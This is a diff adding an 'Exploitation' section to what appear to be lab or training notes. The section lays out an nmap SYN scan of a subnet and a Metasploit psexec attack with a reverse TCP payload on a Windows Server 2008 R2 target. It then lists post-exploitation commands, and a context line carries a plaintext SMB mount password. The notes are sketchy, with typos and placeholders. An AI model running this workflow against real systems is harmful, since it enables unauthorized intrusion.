@@ -202,8 +202,39 @@ mount -t cifs -o username=pretest007,password=zxcvbn2,port=1234 //127.0.0.1/PRET
 
 
 
+-----------------------Exploitation----------------------
 
+Setup a typescript to log all nmap and metasploit terminal commands to a file located on root/Desktop
 
+	Script -a /root/Desktop typescript
+
+Use Nmap to enumerate the provided target network (just use simple scan)
+	Nmap -sS 10.10.10.0/24
+
+Start metasploit console
+	msfconole
+
+use exploit for discovered Win Server 2008 R2
+
+	search psexec
+	use {...}
+	set rhost {target ip}
+	set username ...
+	set userpass ...
+
+	set payload reverse tcp payload
+	set lport 4450
+	exploit
+
+Gather the Following Info
+	Process List - ps
+	Currently logged in user - getuid
+	System Information - sysinfo
+	Current Process ID - getpid
+	Print Current Working Directory - pwd
+
+Background
+	Background
 
 
 
